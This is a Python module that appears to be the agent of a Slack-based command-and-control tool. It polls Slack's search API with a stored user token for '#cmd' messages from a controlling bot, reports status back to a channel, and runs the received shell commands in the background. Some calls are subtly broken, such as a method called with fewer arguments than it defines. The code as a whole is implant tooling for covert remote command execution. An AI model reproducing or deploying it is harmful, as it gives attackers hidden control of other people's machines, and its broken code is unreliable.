import requests, json
from pprint import pprint

import urllib.parse
import html

from . import messages
from . import sender
from . import utils
from . import execute


class Searching():
    """docstring for Searching"""
    def __init__(self, options):
        self.options = options
        
    def search_cmd(self):
        data = self.search_message(text='#cmd')

        # pprint(data)

        query = data['query']
        total = data['messages']['total']

        if total == 0:
            utils.print_bad("No message matched ...")
            return

        utils.print_good("Finding IRC messages")
        matches = data['messages']['matches']

        #found irc message
        for item in matches:
            content = item['text']
            utils.print_good("Cheking these message: {0}".format(content))
            #check if the message was a c2 syntax
            if self.options['control_bot'] in content:
                if utils.check_c2_systax(content):
                    cmd, out, nid = utils.check_c2_systax(content)
                    #check duplicate and run it
                    self.process_irc_message(cmd, out)



    def process_irc_message(self, cmd, out, nid):
        #check if duplicate or not
        status_channel = self.options['status_channel_name']
        query = "{0} in:{1}".format(cmd, status_channel)
        data = self.custom_search(query)
        total = data['messages']['total']

        if total == 0:
            #decode HTML to raw command
            cmd = html.unescape(cmd)
            if out != '':
                #create a status
                sm = messages.Messages(self.options)
                mess = {
                    'title' : 'Execute Command with output',
                    'content' : cmd
                }
                sm.send_good(mess)
                utils.print_good('Execute Command with output: {0}'.format(cmd))
                #execute cmd
                #create snippet message with output file


            else:
                #create a status
                sm = messages.Messages(self.options)

                mess = {
                    'title' : 'Execute Command',
                    'filename' : cmd
                }

                sm.send_good(mess)

                #execute cmd
                utils.print_good('Execute Command: {0}'.format(cmd))
                execute.run_as_background(cmd)

                #create attach message with output
                


    ####really search
    def custom_search(self,query):
        data = self.search_message(query=query)
        return data


    def search_message(self, text='', query=''):
        token = self.options['user_token']
        irc = self.options['irc_channel_name']

        # if query != '' search direct query
        if query == '':
            query = "{0} in:{1}".format(text, irc)

        #url encode
        query = urllib.parse.quote(query)

        url = "https://slack.com:443/api/search.messages?query={0}&count=100&pretty=1".format(query)
        r = sender.send_GET(url, token)
        if r.status_code == 200:
            data = json.loads(r.text)

        return data